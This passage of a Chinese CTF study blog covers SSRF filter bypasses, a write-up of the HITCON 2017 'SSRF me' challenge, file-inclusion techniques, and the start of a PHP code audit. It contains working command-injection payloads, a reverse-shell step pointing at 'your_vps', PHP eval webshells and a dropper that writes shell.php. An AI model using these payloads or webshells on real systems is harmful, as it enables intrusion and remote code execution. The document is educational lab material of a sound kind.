curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span></span><br><span class="line"><span class="php">    $result=curl_exec($curlobj);</span></span><br><span class="line"><span class="php">    curl_close($curlobj);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $filename = <span class="string">'./curled/'</span>.rand().<span class="string">'.txt'</span>;</span></span><br><span class="line"><span class="php">    file_put_contents($filename, $result); </span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $result;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><ul>
<li><p>利用[::],会被解析为本地</p>
</li>
<li><p>利用@，<a href="mailto:``example.com@127.0.0.1" target="_blank" rel="noopener">``example.com@127.0.0.1</a>``,比较经典的解析差异就是利用了两个@</p>
</li>
<li><p>短地址</p>
</li>
<li><p>特殊域名，本质是DNS解析，<code>127.0.0.1.xip.io</code>，比较经典的一个地址，或者<code>www.baidu.com.127.0.0.1.xip.io</code></p>
</li>
<li><p>利用DNS解析，本质和上面那个一样，但是没有复现（留个坑</p>
</li>
<li><p>利用Enclosed alphanumerics<br>ctf wiki上康到的，翻译过来好像叫文数字</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  <span class="meta">&gt;&gt;&gt;  </span>example.com</span><br><span class="line"><span class="symbol">List:</span></span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
</li>
<li><p>更改ip地址写法绕过，比如更换进制，16进制，8进制，10进制18进制整数，访问时加0表示八进制，比如<code>0177.0.0.1</code></p>
</li>
<li><p>利用句号，<code>127。0。0。1</code></p>
</li>
<li><p>特殊省略模式，<code>127.1</code></p>
</li>
<li><p>特殊地址，<code>0</code>和<code>0.0.0.0</code></p>
</li>
</ul>
<p>上面的方式各种组合一般就能达到绕过的目的了<br>后续可以利用gopher，file等协议</p>
<p>第二个trick当时在hgame出现过，那个时候还不知道这叫ssrf</p>
<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个时候，我才发现代码最上面有一个<span class="literal">admin</span>.php，于是我，把这个题又开了一个网页，直接输入/<span class="literal">admin</span>.php，出现的是：only localhost can see it，那么这里大概就要绕到localhost去看<span class="literal">admin</span>.php了，于是更改url为：url=http://@<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">80</span>@www.baidu.com/<span class="literal">admin</span>.php，这样就绕过了step9，step10，但读的还是 <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">80</span>/<span class="literal">admin</span>.php，回车，</span><br></pre></td></tr></table></figure>

<h2 id="SSRF-me"><a href="#SSRF-me" class="headerlink" title="SSRF me"></a>SSRF me</h2><p>（上文攻击面第五个）</p>
<p>wp参考：<a href="https://lihuaiqiu.github.io/2019/07/13/BUUCTF-Writeup-%E4%B8%80/#more" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/13/BUUCTF-Writeup-%E4%B8%80/#more</a></p>
<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  $sandbox = <span class="string">"sandbox/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">  @mkdir($sandbox);</span><br><span class="line">  @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">   $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>]));</span><br><span class="line">   $info = pathinfo($_GET[<span class="string">"filename"</span>]);</span><br><span class="line">   $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">   @mkdir($dir);</span><br><span class="line">   @chdir($dir);</span><br><span class="line">   @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data);</span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>原题为<code>HITCON 2017</code>，这段代码大概意思为，首先通过XFF判断用户ip,建立沙盒，并且通过<code>GET</code>传入<code>url</code>和<code>filename</code>两个参数，通过filename建立新的目录以及文件名，通过url进行<code>shell_exec</code>的GET命令执行，最终把执行的结果放在新生成的目录下的文件名中。</p>
<p>首先来研究一下pathinfo函数以及basename函数的机制</p>
<p><a href="https://s2.ax1x.com/2019/07/11/Z2sbAs.png" target="_blank" rel="noopener"><img src="/2019/08/21/BUUOJ_SSRF/Z2sbAs.png" alt="Z2sbAs.png"></a></p>
<p><code>basename()</code> 函数返回路径中的文件名部分,对于如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>$path = <span class="string">"/testweb/home.php"</span>;<span class="comment">//显示带有文件扩展名的文件名</span></span><br><span class="line"><span class="keyword">echo</span> basename($path);   <span class="comment">//home.php//显示不带有文件扩展名的文件名</span></span><br><span class="line"><span class="keyword">echo</span> basename($path,<span class="string">".php"</span>);  <span class="comment">//home</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码对于想要建立的目录都会进行两次<code>basename</code>，对于如下代码做下实验：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url=<span class="string">'http://www.baidu.com/'</span>;</span><br><span class="line">$filename=<span class="string">'/jay/v/wp'</span>;</span><br><span class="line"><span class="comment">#$data = shell_exec("GET " . escapeshellarg($url));</span></span><br><span class="line">$info = pathinfo($filename);</span><br><span class="line">$dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">print_r (pathinfo($filename));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-----------"</span>;</span><br><span class="line"><span class="keyword">echo</span> $dir;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-----------"</span>;</span><br><span class="line"><span class="keyword">echo</span> $info[<span class="string">"dirname"</span>]; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-----------"</span>;</span><br><span class="line"><span class="keyword">echo</span> basename($info[<span class="string">'basename'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-----------"</span>;</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line"><span class="code">    [dirname] =&gt; /jay/v</span></span><br><span class="line"><span class="code">    [basename] =&gt; wp</span></span><br><span class="line"><span class="code">    [filename] =&gt; wp</span></span><br><span class="line">)</span><br><span class="line">-----------v</span><br><span class="line">-----------/jay/v</span><br><span class="line">-----------wp</span><br><span class="line">-----------</span><br></pre></td></tr></table></figure>

<p>（但其实我们如果传入的filename就是文件名的话，其实用不到basename这边的函数）</p>
<h4 id="escapeshellarg与escapeshellcmd函数"><a href="#escapeshellarg与escapeshellcmd函数" class="headerlink" title="escapeshellarg与escapeshellcmd函数"></a>escapeshellarg与escapeshellcmd函数</h4><p><strong>escapeshellarg</strong></p>
<p>1.确保用户只传递一个参数给命令<br>2.用户不能指定更多的参数一个<br>3.用户不能执行不同的命令</p>
<p>其实我的理解就是把传入的字符串加单引号，如果我传入的是<code>ls</code>，那么经过函数操作后就变成了<code>&#39;ls&#39;</code>。同时会对传入的单引号进行一些安全处理，例如传入<code>l&#39;s</code>，那么经过处理就会变成</p>
<p><code>&#39;l&#39;\&#39;&#39;s&#39;</code>。但是结合了<code>escapeshellcmd</code>就会造成一些危险的问题。函数简单介绍如下：</p>
<p>1.确保用户只执行一个命令<br>2.用户可以指定不限数量的参数<br>3.用户不能执行不同的命令</p>
<p>其作用也就是将一些危险符号进行转义，如</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&amp;，|，；，\ `</span></span><br></pre></td></tr></table></figure>

<p>下面会有详解。</p>
<h4 id="GET命令漏洞"><a href="#GET命令漏洞" class="headerlink" title="GET命令漏洞"></a>GET命令漏洞</h4><p>根本原因还是在于<code>perl</code>的<code>GET</code>函数底层实际上调用的是<code>open</code>处理，而在<code>perl</code>中，open是可以执行系统命令的。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@iZuf6420mwa64xegn82ysrZ:~# cat 1.pl</span><br><span class="line">open(FD,<span class="string">"|id"</span>);</span><br><span class="line"><span class="builtin-name">print</span> &lt;FD&gt;;</span><br><span class="line">root@iZuf6420mwa64xegn82ysrZ:~# perl 1.pl</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br></pre></td></tr></table></figure>

<p>从这段命令我们可看出来perl中open的作用。同时open是支持file协议的</p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">The <span class="keyword">library</span> supports GET <span class="keyword">and</span> HEAD methods <span class="keyword">for</span> <span class="keyword">file</span> requests.  The</span><br><span class="line"><span class="string">"If-Modified-Since"</span> header <span class="keyword">is</span> supported.  <span class="keyword">All</span> other headers are</span><br><span class="line">ignored.  The I&lt;host&gt; <span class="keyword">component</span> <span class="keyword">of</span> the <span class="keyword">file</span> URL must be empty <span class="keyword">or</span> set</span><br><span class="line"><span class="keyword">to</span> <span class="string">"localhost"</span>.  Any other I&lt;host&gt; value will be treated as an <span class="literal">error</span>.</span><br><span class="line">Directories are always converted <span class="keyword">to</span> an HTML document.  <span class="keyword">For</span> normal</span><br><span class="line">files, the <span class="string">"Content-Type"</span> <span class="keyword">and</span> <span class="string">"Content-Encoding"</span> <span class="keyword">in</span> the response are</span><br><span class="line">guessed based <span class="keyword">on</span> the <span class="keyword">file</span> suffix.</span><br><span class="line">Example:</span><br><span class="line">  $req = HTTP::Request-&gt;<span class="keyword">new</span>(GET =&gt; <span class="symbol">'file</span>:/etc/passwd');</span><br></pre></td></tr></table></figure>

<p>尝试一下file协议读取 <code>GET &#39;file:/etc/passwd&#39;</code>或者<code>GET &#39;/etc/passwd&#39;</code>，都可以成功读取出文件内容。下面来尝试下执行系统命令。</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root<span class="symbol">@iZuf6420mwa64xegn82ysrZ</span>:~<span class="meta"># touch <span class="string">'ls|'</span></span></span><br><span class="line">root<span class="symbol">@iZuf6420mwa64xegn82ysrZ</span>:~<span class="meta"># GET <span class="string">'file:ls|'</span></span></span><br></pre></td></tr></table></figure>

<p>通过以上命令成功执行。这里需要注意的是必须要有存在的文件名才能成功执行命令，所以在上面建立了一个<code>ls|</code>文件。</p>
<p>那么这道题的思路就是建立命令执行的文件名，再通过file协议去执行就可以了</p>
<p>首先先看一下大概目录</p>
<p>通过Payload url=/&amp;filename=xxx，然后访问沙盒里面的xxx文件</p>
<p><a href="https://s2.ax1x.com/2019/07/11/ZRn3FI.png" target="_blank" rel="noopener"><img src="/2019/08/21/BUUOJ_SSRF/ZRn3FI.png" alt="ZRn3FI.png"></a></p>
<p>发现<code>flag</code>和<code>readflag</code>,flag是空的，readflag似乎是一个二进制文件？，或许需要通过触发readflag来读取flag。</p>
<p>构造文件名 <code>bash -c /readflag</code>,通过如下payload</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">url</span>=/etc/passwd&amp;filename=bash -c /readflag|		<span class="comment">#（在沙箱中创建该以命令为文件名的文件，防止报错）</span></span><br><span class="line"></span><br><span class="line"><span class="attr">url</span>=file:bash -c /readflag|&amp;filename=a			<span class="comment">#（执行该命令）</span></span><br></pre></td></tr></table></figure>

<p>访问沙盒下的a可以得到flag（这里的<code>/etc/passwd</code>的目的只是为了让我的GET命令请求快点，/flag也可)</p>
<p>第二种方法可以利用反弹shell（尚未复现）</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">url</span>=http://your_vps/port&amp;filename=a</span><br><span class="line"></span><br><span class="line"><span class="attribute">url</span>=/etc/passwd&amp;filename=bash a|</span><br><span class="line"></span><br><span class="line"><span class="attribute">url</span>=file:bash a|&amp;<span class="attribute">filename</span>=xxx</span><br></pre></td></tr></table></figure>

<p>同样需要在你的vps上放一下一句话反弹bash。</p>
<h1 id="（乱入）文件包含漏洞"><a href="#（乱入）文件包含漏洞" class="headerlink" title="（乱入）文件包含漏洞"></a>（乱入）文件包含漏洞</h1><p>利用方式：</p>
<ol>
<li><p>00截断</p>
</li>
<li><p>长度截断（windows：256，Linux：4096）</p>
</li>
<li><p>斜杠点（/.）绕过</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(substr(filename,-<span class="number">4</span>,<span class="number">4</span>)</span></span> != <span class="string">'.php'</span>)		<span class="comment">//斜杠在文件名内不合法，后缀名后的点会被自动删除</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>包含日志文件</p>
</li>
</ol>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问一句话木马，日志文件记录下这个一句话木马，包含这个日志文件		<span class="comment">//你得知道这个日志文件在哪，很苛刻</span></span><br></pre></td></tr></table></figure>

<ol start="5">
<li><p>双写过滤</p>
</li>
<li><p>包含session（session可控）</p>
</li>
<li><p>php伪协议：</p>
</li>
</ol>
<p>   file = php://input</p>
<p>   post内容 ：</p>
   <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php <span class="keyword">system</span>(<span class="string">"dir"</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>   file = zip://路径/shell.zip%23shell.php        （后缀不一定是zip，用了zip协议，就会自动解析成zip）</p>
<p>一句话木马：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[vanish]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>上传写木马文件的文件，然后包含它（好像不太聪明的亚子）:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST[shell]);?&gt;'</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>用php://input 就不用上传了，会直接包含你post的内容来当做是包含它存在的文件，然后就会写入木马文件（稍微聪明点了）</p>
<p>防御方式：</p>
<ol>
<li>open_basedir</li>
<li>过滤   .   /    \ (点，斜杠，反斜杠)</li>
<li>禁止远程包含</li>
<li>尽量不使用动态包含</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/08/21/BUUOJ_SSRF/" data-id="ck2g3l2io000mlgv3xcsbyg8b" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/note/">note</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-dropbox代码审计" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/12/dropbox代码审计/" class="article-date">
  <time datetime="2019-08-12T10:18:00.000Z" itemprop="datePublished">2019-08-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/12/dropbox代码审计/">dropbox代码审计</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="dropbox代码审计"><a href="#dropbox代码审计" class="headerlink" title="dropbox代码审计"></a>dropbox代码审计</h1><p>之前都没怎么完整的读过代码，本身自己php就没学，所以今儿决定还是完整的读一次代码。</p>
<h2 id="register-php"><a href="#register-php" class="headerlink" title="register.php"></a>register.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span></span><br><span class="line"><span class="php">    header(<span class="string">"Location: index.php"</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span>						#检测登录状态</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>娉ㄥ唽<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- Bootstrap core CSS --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.bd-placeholder-img</span> &#123;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">font-size</span>: 1<span class="selector-class">.125rem</span>;</span></span><br><span class="line">      text-anchor: middle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    @<span class="keyword">media</span> (min-width: <span class="number">768px</span>) &#123;</span></span><br><span class="line"><span class="css">      <span class="selector-class">.bd-placeholder-img-lg</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">font-size</span>: 3<span class="selector-class">.5rem</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Custom styles for this template --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/css/std.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-signin"</span> <span class="attr">action</span>=<span class="string">"register.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"h3 mb-3 font-weight-normal"</span>&gt;</span>娉ㄥ唽<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"username"</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span> <span class="attr">required</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-primary btn-block"</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>鎻愪氦<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"mt-5 mb-3 text-muted"</span>&gt;</span>&amp;copy; 2018-2019<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"top"</span> <span class="attr">id</span>=<span class="string">"toast-container"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/bootstrap.bundle.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/toast.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"username"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"password"</span>])) &#123;</span></span><br><span class="line"><span class="php">    $u = <span class="keyword">new</span> User();		<span class="comment">#new一个user对象</span></span></span><br><span class="line"><span class="php">    $username = (string) $_POST[<span class="string">"username"</span>];</span></span><br><span class="line"><span class="php">    $password = (string) $_POST[<span class="string">"password"</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (strlen($username) &lt; <span class="number">20</span> &amp;&amp; strlen($username) &gt; <span class="number">2</span> &amp;&amp; strlen($password) &gt; <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($u-&gt;add_user($username, $password)) &#123;		<span class="comment">#添加新用户并赋值id和账号密码</span></span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span>(<span class="string">"&lt;script&gt;window.location.href='login.php?register';&lt;/script&gt;"</span>);	<span class="comment">#注册成功，跳转到login</span></span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;toast('姝ょ敤鎴峰悕宸茶浣跨敤', 